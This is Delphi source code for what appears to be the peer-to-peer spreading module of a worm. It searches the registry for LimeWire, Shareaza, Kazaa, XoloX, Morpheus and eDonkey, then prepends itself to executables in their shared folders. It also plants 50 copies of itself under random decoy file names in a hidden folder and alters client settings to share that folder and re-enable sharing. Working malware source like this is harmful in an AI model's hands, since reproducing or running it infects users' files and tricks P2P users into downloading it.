   {$I CompMode.INI}

   {$IFDEF Debug}
   UNIT P2P;
   {$ELSE}
   UNIT A8;
   {$ENDIF}

   INTERFACE

   {$IFDEF Debug}
   USES
     Registry, Utils, ACLUtils, Prepender;
   {$ELSE}
   USES
     B1, B3, A6, A11;
   {$ENDIF}

   PROCEDURE SetWinPath;
   PROCEDURE InitPeerToPeer;

   VAR
     Reg     : TRG;
     WinPath : STRING;

   IMPLEMENTATION

   VAR
     Fake : ARRAY [1..50] OF STRING;

   {$I Resources\TADDON.INI}
   {$I Resources\TFAKEFILES.INI}

   PROCEDURE PrependP2PDir(Path:STRING);
   VAR
     S     : STRING;
     Error : Integer;
     D     : TSearchRec;
   BEGIN
     Error:=FindFirst(Path+'*'+MainStr(5),faAnyFile OR faHidden,D);                //".exe"
     WHILE Error=0 DO BEGIN
       IF D.Size<=5000000 THEN Prepend(StartEXEName,Path+D.Name);
       Error:=FindNext(D);
     END;
   END;

   PROCEDURE RandomFileName;
   VAR
     S      : STRING;
     I      : BYTE;
     J      : BYTE;
     Double : BOOL;
   BEGIN
     I:=0;
     Randomize;
     REPEAT
       Double:=False;
       S:=DecodeString(Random(ItemsCountInEncodedString(TFAKEFILES)-1)+1,TFAKEFILES)+' '+DecodeString(Random(ItemsCountInEncodedString(TADDON)-1)+1,TADDON)+MainStr(5); //".exe"
       FOR J:=1 TO I+1 DO IF S=Fake[J] THEN Double:=True;
       IF NOT Double THEN BEGIN
         Inc(I);
         Fake[I]:=S;
       END;
     UNTIL I=50;
   END;

   PROCEDURE SetWinPath;
   VAR
     PWindowsDir : ARRAY [0..255] OF Char;
   BEGIN
     GetWindowsDirectory(PWindowsDir,255);
     WinPath:=STRING(PWindowsDir)+'\';
   END;

   PROCEDURE MakeFakeFiles(SharedDir:STRING);
   VAR
     I : WORD;
   BEGIN
     PrependP2PDir(SharedDir+'\');
     If SharedDir<>'' THEN BEGIN
       RandomFileName;
       CreateDir(SharedDir,0);
       SetFileAttributes(pChar(SharedDir),FILE_ATTRIBUTE_HIDDEN);
       FOR I:=1 TO 50 DO CopyFiles(False,SharedDir+'\'+Fake[I]);
     END;
   END;

   ////////////////////////////////\EDONKEY/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

   FUNCTION FindEDonkey : BOOL;
   BEGIN
     Reg.RootKey:=HKEY_CURRENT_USER;
     RESULT:=Reg.KeyExists(MainStr(46)+MainStr(6));                                //"ed2k"
     Reg.CloseKey;
   END;

   FUNCTION EDonkeyShare : STRING;
   VAR
     I : WORD;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Reg.OpenKey(MainStr(47)+MainStr(7),False);                                    //"Windows\CurrentVersion\Uninstall\eDonkey2000"
     RESULT:=Reg.ReadString(MainStr(8));                                           //"UninstallString"
     I:=Pos(MainStr(50),RESULT);                                                   //"uninstall"
     IF I>0 THEN RESULT:=Copy(Result,2,I-2)+MainStr(9);                            //"incoming"
     Reg.CloseKey;
   END;

   /////////////////////////////////\MORPHEUS/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

   FUNCTION FindMorpheus : BOOL;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     RESULT:=Reg.KeyExists(MainStr(46)+MainStr(10));                               //"Morpheus"
     Reg.CloseKey;
   END;

   FUNCTION MorpheusShare : STRING;
   VAR
     I : WORD;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Reg.OpenKey(MainStr(47)+MainStr(11),False);                                   //"Windows\CurrentVersion\Uninstall\Morpheus 2.0"
     RESULT:=Reg.ReadString(MainStr(8));                                           //"UninstallString"
     I:=Pos(MainStr(51),RESULT);                                                   //"UNWISE.EXE"
     IF I>0 THEN RESULT:=Copy(Result,1,I-2)+MainStr(12);                           //"\My Shared Folder"
     Reg.CloseKey;
   END;

   //////////////////////////////////\XOLOX/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

   FUNCTION FindXoloX : BOOL;
   BEGIN
     Reg.RootKey:=HKEY_CURRENT_USER;
     RESULT:=Reg.KeyExists(MainStr(46)+MainStr(13));                               //"Xolox"
     Reg.CloseKey;
   END;

   FUNCTION XoloxShare : STRING;
   BEGIN
     Reg.RootKey:=HKEY_CURRENT_USER;
     Reg.OpenKey(MainStr(46)+MainStr(13),False);                                   //"Xolox"
     RESULT:=Reg.ReadString(MainStr(14));                                          //"shareddirs"
     IF Pos(WinPath+MainStr(56),RESULT)=0 THEN Reg.WriteString(MainStr(14),RESULT+'|'+WinPath+MainStr(56)+'\'); //"shareddirs"
     Reg.CloseKey;
     RESULT:=WinPath+MainStr(56);
   END;

   ///////////////////////////////////\KAZAA/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

   FUNCTION FindKazaa : BOOL;
   BEGIN
     Reg.RootKey:=HKEY_CURRENT_USER;
     RESULT:=Reg.KeyExists(MainStr(46)+MainStr(15));                               //"Kazaa"
     Reg.CloseKey;
   END;

   FUNCTION KazaaShare : STRING;
   VAR
     Dir : STRING;
     I   : WORD;
   BEGIN
     Reg.RootKey:=HKEY_CURRENT_USER;
     Reg.OpenKey(MainStr(46)+MainStr(16),True);                                    //"Kazaa\LocalContent"
     I:=0;
     REPEAT
       Dir:=MainStr(55)+IntToStr(I);                                               //"Dir"
       Inc(I);
       RESULT:=Reg.ReadString(Dir);
     UNTIL (RESULT='')or(Pos(MainStr(56),RESULT)>0);
     IF RESULT='' THEN Reg.WriteString(Dir,MainStr(17)+WinPath+MainStr(56));       // <- Create Dir to Fake Files   //"012345:"
     Reg.WriteInteger(MainStr(18),0);                                              // <- Enable File Sharing        //"DisableSharing"
     Reg.CloseKey;
     RESULT:=WinPath+MainStr(56);
   END;

   /////////////////////////////////\SHAREAZA/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

   FUNCTION FindShareaza : BOOL;
   BEGIN
     Reg.RootKey:=HKEY_CURRENT_USER;
     RESULT:=Reg.KeyExists(MainStr(46)+MainStr(19));                               //"Shareaza"
     Reg.CloseKey;
   END;

   FUNCTION ShareazaShare : STRING;
   BEGIN
     Reg.RootKey:=HKEY_CURRENT_USER;
     Reg.OpenKey(MainStr(46)+MainStr(20),False);                                   //"Shareaza\Shareaza\Transfers"
     RESULT:=Reg.ReadString(MainStr(21));                                          //"DownloadsPath"
     Reg.CloseKey;
   END;

   /////////////////////////////////\LIMEWIRE/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

   FUNCTION FindLimeWire : BOOL;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     RESULT:=Reg.KeyExists(MainStr(46)+MainStr(22));                               //"LimeWire"
     Reg.CloseKey;
   END;

   FUNCTION LimeWireShare : STRING;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Reg.OpenKey(MainStr(46)+MainStr(22),False);                                   //"LimeWire"
     RESULT:=Reg.ReadString(MainStr(24))+MainStr(25);                              //"InstallDir","\Shared"
     Reg.CloseKey;
   END;

   ///////////////////////////////////\INIT/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

   PROCEDURE InitPeerToPeer;
   BEGIN
     Randomize;
     Reg:=TRG.Create;
     MakeFakeFiles(MainStr(26));                                                   //"C:\My Downloads"
     IF FindLimeWire THEN MakeFakeFiles(LimeWireShare);
     IF FindShareaza THEN MakeFakeFiles(ShareazaShare);
     IF FindKazaa THEN MakeFakeFiles(KazaaShare);
     IF FindXolox THEN MakeFakeFiles(XoloXShare);
     IF FindMorpheus THEN MakeFakeFiles(MorpheusShare);
     IF FindEdonkey THEN MakeFakeFiles(EdonkeyShare);
     Reg.CloseKey;
   END;

   END.
